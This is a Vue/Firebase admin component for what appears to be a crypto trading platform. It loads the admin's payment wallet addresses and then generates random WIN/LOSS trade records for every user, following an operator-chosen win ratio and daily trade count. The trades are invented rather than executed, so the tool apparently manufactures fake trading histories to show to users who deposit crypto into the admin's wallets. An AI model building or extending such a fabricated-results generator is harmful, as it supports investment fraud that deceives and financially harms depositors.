<script setup lang="ts">
import {ref, onMounted} from 'vue'
import {db} from '@/firebase'
import {collection, getDocs, doc, setDoc, getDoc} from 'firebase/firestore'
import {format} from 'date-fns'
import {useAppStore} from '@/stores/app'
import {fetchUserSummaries} from "@/utils/fetchUserSummaries";

const {snackbarObject} = useAppStore()

// Inputs
const winRatio = ref(0.6) // 60% WIN default
const tradesPerDay = ref(20) // Default 20 trades per day
const loading = ref(false)
const trades = ref([])
const userSummaries = ref<{ userId: string, profit: number, loss: number }[]>([])

// Admin address assets
const addresses = ref<{ paymentMethod: any; code: string; wallet: string }[]>([])

const fetchAddresses = async () => {
  try {
    // const adminId = import.meta.env.VITE_ADMIN1
    const adminId = "zFCOfQUnSgfxwD6XWAfOa9Fz1yo1"
    const adminDoc = await getDoc(doc(db, 'leadway_users', adminId))

    if (!adminDoc.exists()) {
      console.error('Admin profile not found')
      return
    }

    const adminProfile = adminDoc.data()
    addresses.value = [
      {paymentMethod: 'Ethereum (ETH)', code: 'ETH', wallet: adminProfile?.ethereum},
      {paymentMethod: 'Bitcoin (BTC)', code: 'BTC', wallet: adminProfile?.bitcoinWallet},
      {paymentMethod: 'Ripple (XRP)', code: 'XRP', wallet: adminProfile?.XRP},
      {paymentMethod: 'Litecoin (LTC)', code: 'LTC', wallet: adminProfile?.LTC},
      {paymentMethod: 'USDT', code: 'USDT', wallet: adminProfile?.USDT},
    ].filter(asset => asset.wallet) // Only include methods with wallets
  } catch (error) {
    console.error('Failed to fetch admin addresses:', error)
  }
}

onMounted(() => {
  fetchAddresses()
})

const generateTrades = async () => {
  if (!addresses.value.length) {
    alert('Payment methods not loaded yet.')
    return
  }

  try {
    loading.value = true

    const usersSnap = await getDocs(collection(db, 'leadway_users'))
    const users = usersSnap.docs.map(doc => ({id: doc.id, ...doc.data()}))

    const now = new Date()
    const currentMonth = format(now, 'yyyy-MM')
    const daysInMonth = new Date(now.getFullYear(), now.getMonth() + 1, 0).getDate()

    for (const user of users) {
      for (let day = 1; day <= now.getDate(); day++) {
        const dateStr = `${currentMonth}-${day.toString().padStart(2, '0')}`
        const trades: any[] = []

        for (let i = 0; i < tradesPerDay.value; i++) {
          const isWin = Math.random() < winRatio.value
          const randomAsset = addresses.value[Math.floor(Math.random() * addresses.value.length)]

          const trade = {
            asset: {
              code: randomAsset.code,
              paymentMethod: randomAsset.paymentMethod,
            },
            contract: isWin ? 'WIN' : 'LOSS',
            date: dateStr,
            profitOrLossPayout: isWin ? 20 : -10,
            sendTradeHistory: true,
            timestamp: Date.now(),
            tradeStatus: isWin ? 'WIN' : 'LOSS',
            tradingAmount: 100,
          }

          trades.push(trade)
        }

        for (const trade of trades) {
          const tradeId = crypto.randomUUID()
          await setDoc(doc(db, 'future_trades', user.id, currentMonth, tradeId), trade)
        }
      }
    }

    loading.value = false

    snackbarObject.show = true;
    snackbarObject.message = "Trades successfully generated!";
    snackbarObject.color = "info";
  } catch (err) {
    loading.value = false
    console.error('Error generating trades:', err)

    snackbarObject.show = true;
    snackbarObject.message = "Something went wrong. Check console for details.";
    snackbarObject.color = "error"
  }
}

onMounted(async () => {
  fetchAddresses()
  userSummaries.value = await fetchUserSummaries()
})
</script>

<template>
  <v-container>
    <v-card class="pa-4" elevation="2">
      <v-text-field
        type="number"
        step="0.01"
        variant="outlined"
        v-model.number="winRatio"
        label="WIN/Loss Ratio (e.g. 0.6 for 60% WIN)"
        min="0"
        max="1"
      />
      <v-text-field
        type="number"
        variant="outlined"
        v-model.number="tradesPerDay"
        label="Number of Trades per Day"
        min="1"
        max="100"
      />
      <v-btn
        @click="generateTrades"
        :loading="loading"
        :disabled="loading"
        color="indigo-accent-4"
        class="mt-4 text-capitalize"
        variant="flat"
        rounded="lg"
      >
        Generate Trades
      </v-btn>
    </v-card>

    <TradeBarChart
      class="my-10"
      :data="userSummaries.map(u => ({
        userId: u.userId,
        profit: u.profit,
        loss: u.loss,
      }))"
    />

    <UserTradesTable/>
  </v-container>
</template>
